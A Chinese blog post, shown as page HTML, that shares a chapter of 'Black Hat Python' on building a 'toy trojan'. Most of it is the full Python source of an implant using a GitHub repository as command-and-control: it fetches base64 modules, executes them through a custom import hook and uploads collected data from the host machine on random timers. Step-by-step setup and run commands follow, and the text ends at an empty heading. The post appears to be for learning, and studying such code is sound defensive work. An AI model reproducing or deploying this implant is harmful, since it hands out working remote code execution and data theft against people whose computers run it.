@@ -1,0 +1,644 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>用python和github构建一只玩具木马 - 夜行人</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="种瓜" /><meta name="description" content="周末在新街口大众书局看到 《Black Hat Python》(《python黑帽子 &amp;ndash;黑客与渗透测试编程之道》),饶有兴致地翻了翻, 觉得第" /><meta name="keywords" content="education, programming, Technology" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.96.0 with theme even" />
+
+
+<link rel="canonical" href="http://wwj718.github.io/post/%E7%BC%96%E7%A8%8B/use-python-and-github-create-trojan-horse/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+<link href="/sass/main.min.69e0bbe2419d9b0efbdcc1d3b4338bba03a6f6789ae2832bc1af58e5b2757470.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
+
+<meta property="og:title" content="用python和github构建一只玩具木马" />
+<meta property="og:description" content="周末在新街口大众书局看到 《Black Hat Python》(《python黑帽子 &ndash;黑客与渗透测试编程之道》),饶有兴致地翻了翻, 觉得第" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://wwj718.github.io/post/%E7%BC%96%E7%A8%8B/use-python-and-github-create-trojan-horse/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2016-07-13T00:00:00+00:00" />
+<meta property="article:modified_time" content="2016-07-13T00:00:00+00:00" />
+
+<meta itemprop="name" content="用python和github构建一只玩具木马">
+<meta itemprop="description" content="周末在新街口大众书局看到 《Black Hat Python》(《python黑帽子 &ndash;黑客与渗透测试编程之道》),饶有兴致地翻了翻, 觉得第"><meta itemprop="datePublished" content="2016-07-13T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2016-07-13T00:00:00+00:00" />
+<meta itemprop="wordCount" content="1933">
+<meta itemprop="keywords" content="dev-tools," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="用python和github构建一只玩具木马"/>
+<meta name="twitter:description" content="周末在新街口大众书局看到 《Black Hat Python》(《python黑帽子 &ndash;黑客与渗透测试编程之道》),饶有兴致地翻了翻, 觉得第"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">夜行人</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a><a href="/categories/">
+        <li class="mobile-menu-item">Categories</li>
+      </a><a href="/post/%E9%9A%8F%E7%AC%94/aboutme/">
+        <li class="mobile-menu-item">About-Me</li>
+      </a>
+  </ul>
+</nav>
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">夜行人</a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/tags/">Tags</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/categories/">Categories</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/post/%E9%9A%8F%E7%AC%94/aboutme/">About-Me</a>
+      </li>
+  </ul>
+</nav>
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">用python和github构建一只玩具木马</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2016-07-13 </span>
+        <div class="post-category">
+            <a href="/categories/%E7%BC%96%E7%A8%8B/"> 编程 </a>
+            </div>
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content always-active">
+    <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#相关模块说明">相关模块说明</a></li>
+        <li><a href="#运行">运行</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#热加载">热加载</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#编码问题">编码问题</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      <p>周末在新街口大众书局看到 《Black Hat Python》(《python黑帽子 &ndash;黑客与渗透测试编程之道》),饶有兴致地翻了翻, 觉得第七章很有意思，分享过来</p>
+<p>作者在这一章里说道</p>
+<blockquote>
+<p>One of the most challenging aspects of creating a solid trojan framework is asynchronously controlling, updating, and receiving data from your deployed implants. It’s crucial to have a relatively universal way to push code to your remote trojans</p>
+</blockquote>
+<p>写一个特洛伊木马的的挑战之一是异步地控制、更新和接收数据，并且能够通用的方法给你的木马们远程推送指令，而作者试图在这一章中给出一个漂亮的解决方案</p>
+<h1 id="木马">木马</h1>
+<p>上边说的的木马是什么鬼</p>
+<p>据维基百科说 , &ldquo;木马&quot;这一名称来源于希腊神话特洛伊战争的特洛伊木马。攻城的希腊联军佯装撤退后留下一只木马，特洛伊人将其当作战利品带回城内。当特洛伊人为胜利而庆祝时，从木马中出来了一队希腊兵，它们悄悄打开城门，放进了城外的军队，最终攻克了特洛伊城。计算机中所说的木马与病毒一样也是一种有害的程序，其特征与特洛伊木马一样具有伪装性，看起来挺好的，却会在用户不经意间，对用户的计算机系统产生破坏或窃取数据，特别是用户的各种账户及口令等重要且需要保密的信息，甚至控制用户的计算机系统。</p>
+<p>经过一番追本溯源，计算机中这种被称为木马的程序有哪些特性，大家大体上应该有个印象了，如果不用隐喻，要描述出这类程序的特质，恐怕要多费许多口舌</p>
+<p>计算机科学的趣味之一是它的词汇异常丰富和生动，有大量的隐喻和类比</p>
+<p>《代码大全》在开篇的不久说道：</p>
+<blockquote>
+<p>计算机科学领域中有着搜友学科中最为丰富多彩的语言。你走进一间安全严密，温度精确控制在20℃的房间，并在里面发现了病毒（virus），特洛伊木马（Trojan horse），蠕虫（worm），臭虫（bug），逻辑炸弹（bomb），崩溃（crash），论坛口水战（flame），双绞线转换头（twisted sex changer），还有致命错误（fatal error）……在其他领域中，你能遇到这些吗？</p>
+</blockquote>
+<h1 id="正餐">正餐</h1>
+<p>在着一章中，作者主要演示了如何利用github作为控制和数据中心，构建灵活的木马，至于你要用木马来做什么，你可以发挥想象自己写插件到module里</p>
+<blockquote>
+<p>talk is cheap,show me your code</p>
+</blockquote>
+<p>代码不长，直接贴上(大家可以直接看<a href="https://github.com/wwj718/blackhatpythonbook">源码库</a>)，值得说明的地方稍后讲解</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">imp</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">threading</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">Queue</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#import os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">yaml</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">github3</span> <span class="kn">import</span> <span class="n">login</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">trojan_id</span> <span class="o">=</span> <span class="s2">&#34;abc&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">trojan_config</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="si">%s</span><span class="s2">.json&#34;</span> <span class="o">%</span> <span class="n">trojan_id</span>
+</span></span><span class="line"><span class="cl"><span class="n">data_path</span>     <span class="o">=</span> <span class="s2">&#34;data/</span><span class="si">%s</span><span class="s2">/&#34;</span> <span class="o">%</span> <span class="n">trojan_id</span>
+</span></span><span class="line"><span class="cl"><span class="n">trojan_modules</span><span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">task_queue</span>    <span class="o">=</span> <span class="n">Queue</span><span class="o">.</span><span class="n">Queue</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">configured</span>    <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;./local.yaml&#34;</span><span class="p">,</span><span class="s2">&#34;r&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">config</span> <span class="o">=</span> <span class="n">yaml</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">username</span> <span class="o">=</span> <span class="n">config</span><span class="p">[</span><span class="s2">&#34;username&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">password</span> <span class="o">=</span> <span class="n">config</span><span class="p">[</span><span class="s2">&#34;password&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">GitImporter</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">current_module_code</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">find_module</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">fullname</span><span class="p">,</span><span class="n">path</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">configured</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span> <span class="s2">&#34;[*] Attempting to retrieve </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">fullname</span>
+</span></span><span class="line"><span class="cl">            <span class="n">new_library</span> <span class="o">=</span> <span class="n">get_file_contents</span><span class="p">(</span><span class="s2">&#34;modules/</span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">fullname</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">new_library</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="bp">self</span><span class="o">.</span><span class="n">current_module_code</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">new_library</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="bp">self</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">load_module</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">name</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">module</span> <span class="o">=</span> <span class="n">imp</span><span class="o">.</span><span class="n">new_module</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">exec</span> <span class="bp">self</span><span class="o">.</span><span class="n">current_module_code</span> <span class="ow">in</span> <span class="n">module</span><span class="o">.</span><span class="vm">__dict__</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="n">name</span><span class="p">]</span> <span class="o">=</span> <span class="n">module</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">module</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">connect_to_github</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">gh</span> <span class="o">=</span> <span class="n">login</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="o">=</span><span class="n">password</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">repo</span> <span class="o">=</span> <span class="n">gh</span><span class="o">.</span><span class="n">repository</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="s2">&#34;blackhatpythonbook&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">branch</span> <span class="o">=</span> <span class="n">repo</span><span class="o">.</span><span class="n">branch</span><span class="p">(</span><span class="s2">&#34;master&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">gh</span><span class="p">,</span><span class="n">repo</span><span class="p">,</span><span class="n">branch</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_file_contents</span><span class="p">(</span><span class="n">filepath</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">gh</span><span class="p">,</span><span class="n">repo</span><span class="p">,</span><span class="n">branch</span> <span class="o">=</span> <span class="n">connect_to_github</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">tree</span> <span class="o">=</span> <span class="n">branch</span><span class="o">.</span><span class="n">commit</span><span class="o">.</span><span class="n">commit</span><span class="o">.</span><span class="n">tree</span><span class="o">.</span><span class="n">recurse</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">filename</span> <span class="ow">in</span> <span class="n">tree</span><span class="o">.</span><span class="n">tree</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">filepath</span> <span class="ow">in</span> <span class="n">filename</span><span class="o">.</span><span class="n">path</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span> <span class="s2">&#34;[*] Found file </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">filepath</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="n">blob</span> <span class="o">=</span> <span class="n">repo</span><span class="o">.</span><span class="n">blob</span><span class="p">(</span><span class="n">filename</span><span class="o">.</span><span class="n">_json_data</span><span class="p">[</span><span class="s1">&#39;sha&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">blob</span><span class="o">.</span><span class="n">content</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_trojan_config</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">configured</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">config_json</span>   <span class="o">=</span> <span class="n">get_file_contents</span><span class="p">(</span><span class="n">trojan_config</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">config</span>        <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">config_json</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">configured</span>    <span class="o">=</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">task</span> <span class="ow">in</span> <span class="n">config</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">task</span><span class="p">[</span><span class="s1">&#39;module&#39;</span><span class="p">]</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="n">exec</span><span class="p">(</span><span class="s2">&#34;import </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">task</span><span class="p">[</span><span class="s1">&#39;module&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">config</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">store_module_result</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">gh</span><span class="p">,</span><span class="n">repo</span><span class="p">,</span><span class="n">branch</span> <span class="o">=</span> <span class="n">connect_to_github</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">remote_path</span> <span class="o">=</span> <span class="s2">&#34;data/</span><span class="si">%s</span><span class="s2">/</span><span class="si">%d</span><span class="s2">.data&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">trojan_id</span><span class="p">,</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1000</span><span class="p">,</span><span class="mi">100000</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">repo</span><span class="o">.</span><span class="n">create_file</span><span class="p">(</span><span class="n">remote_path</span><span class="p">,</span><span class="s2">&#34;Commit message&#34;</span><span class="p">,</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">module_runner</span><span class="p">(</span><span class="n">module</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">task_queue</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="n">module</span><span class="p">]</span><span class="o">.</span><span class="n">run</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">task_queue</span><span class="o">.</span><span class="n">get</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># store the result in our repo</span>
+</span></span><span class="line"><span class="cl">    <span class="n">store_module_result</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># main trojan loop</span>
+</span></span><span class="line"><span class="cl"><span class="n">sys</span><span class="o">.</span><span class="n">meta_path</span> <span class="o">=</span> <span class="p">[</span><span class="n">GitImporter</span><span class="p">()]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">task_queue</span><span class="o">.</span><span class="n">empty</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">config</span> <span class="o">=</span> <span class="n">get_trojan_config</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">task</span> <span class="ow">in</span> <span class="n">config</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">t</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">module_runner</span><span class="p">,</span><span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">task</span><span class="p">[</span><span class="s1">&#39;module&#39;</span><span class="p">],))</span>
+</span></span><span class="line"><span class="cl">            <span class="n">t</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">10</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1000</span><span class="p">,</span><span class="mi">10000</span><span class="p">))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="相关模块说明">相关模块说明</h3>
+<h5 id="github3pyhttpsgithubcomsigmavirus24github3py"><a href="https://github.com/sigmavirus24/github3.py">github3.py</a></h5>
+<blockquote>
+<p>Python library for interfacing with the GitHub APIv3</p>
+</blockquote>
+<h5 id="imphttpsdocspythonorg2libraryimphtml"><a href="https://docs.python.org/2/library/imp.html">imp</a></h5>
+<blockquote>
+<p>Access the import internals</p>
+</blockquote>
+<h3 id="运行">运行</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#fork https://github.com/wwj718/blackhatpythonbook</span>
+</span></span><span class="line"><span class="cl">git clone https://github.com/USERNAME/blackhatpythonbook
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> blackhatpythonbook
+</span></span><span class="line"><span class="cl">mv local.yaml.template local.yaml
+</span></span><span class="line"><span class="cl"><span class="c1">#填入你的github的用户名和密码</span>
+</span></span><span class="line"><span class="cl">pip install github3.py
+</span></span><span class="line"><span class="cl">python git_trojan.py
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>之后你的本机数据将每隔一段时间上传到data/abc目录中，值得注意的是，数据经过base64编码</p>
+<p>你也可以在modules目录下新建功能脚本，脚本将被定期拉到client执行，这样一来你可以以插件的形式来添加task</p>
+<h1 id="想象空间">想象空间</h1>
